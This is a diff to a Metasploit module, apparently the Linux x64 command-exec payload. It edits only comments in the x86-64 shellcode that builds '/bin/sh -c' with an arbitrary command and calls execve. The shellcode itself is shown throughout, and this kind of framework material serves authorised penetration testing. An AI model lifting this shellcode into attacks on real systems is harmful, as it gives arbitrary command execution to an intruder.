@@ -48,7 +48,7 @@ module MetasploitModule
             push rdx
             push rax
             push rsp
-            pop rdi                 ; "//bin/sh\0"
+            pop rdi                 ; "//bin/sh"
 
             push rdx
             pop rsi                 ; NULL
@@ -56,7 +56,7 @@ module MetasploitModule
             push 0x3b
             pop rax
 
-            syscall
+            syscall                 ; execve("//bin/sh", NULL, NULL)
         EOS
 
       else
@@ -67,7 +67,7 @@ module MetasploitModule
 
             push rax
             push rsp
-            pop rdi                 ; "/bin/sh\0"
+            pop rdi                 ; "/bin/sh"
 
             push rdx
             pop rsi                 ; NULL
@@ -75,7 +75,7 @@ module MetasploitModule
             push 0x3b
             pop rax
 
-            syscall
+            syscall                 ; execve("/bin/sh", NULL, NULL)
         EOS
       end
     else
@@ -106,7 +106,7 @@ module MetasploitModule
 
             jmp tocall              ; jmp/call/pop cmd address
           afterjmp:
-            pop rbp                 ; "cmd"
+            pop rbp                 ; *CMD*
 
             push rdx
             pop rbx
@@ -116,24 +116,24 @@ module MetasploitModule
             push rdx
             #{pushw_c_opt}
             push rsp
-            pop rsi                 ; "-c\0"
+            pop rsi                 ; "-c"
 
             push rdx
             push rax
             push rsp
-            pop rdi                 ; "//bin/sh\0"
+            pop rdi                 ; "//bin/sh"
 
-            push rdx
-            push rbp
-            push rsi
-            push rdi
+            push rdx                ; NULL
+            push rbp                ; *CMD*
+            push rsi                ; "-c"
+            push rdi                ; "//bin/sh"
             push rsp
-            pop rsi
+            pop rsi                 ; ["//bin/sh", "-c", "*CMD*"]
 
             push 0x3b
             pop rax
 
-            syscall
+            syscall                 ; execve("//bin/sh", ["//bin/sh", "-c", "*CMD*"], NULL)
           tocall:
             call afterjmp
             db "#{cmd}"             ; arbitrary command
@@ -146,26 +146,26 @@ module MetasploitModule
 
             push rax
             push rsp
-            pop rdi                 ; "/bin/sh\0"
+            pop rdi                 ; "/bin/sh"
 
             push rdx
             #{pushw_c_opt}
             push rsp
-            pop rsi                 ; "-c\0"
+            pop rsi                 ; "-c"
 
-            push rdx
+            push rdx                ; NULL
             call continue
             db "#{cmd}", 0x00       ; arbitrary command
           continue:
-            push rsi
-            push rdi
+            push rsi                ; "-c"
+            push rdi                ; "/bin/sh"
             push rsp
-            pop rsi
+            pop rsi                 ; ["/bin/sh", "-c", "*CMD*"]
 
             push 0x3b
             pop rax
 
-            syscall
+            syscall                 ; execve("/bin/sh", ["/bin/sh", "-c", "*CMD*"], NULL)
         EOS
       end
     end
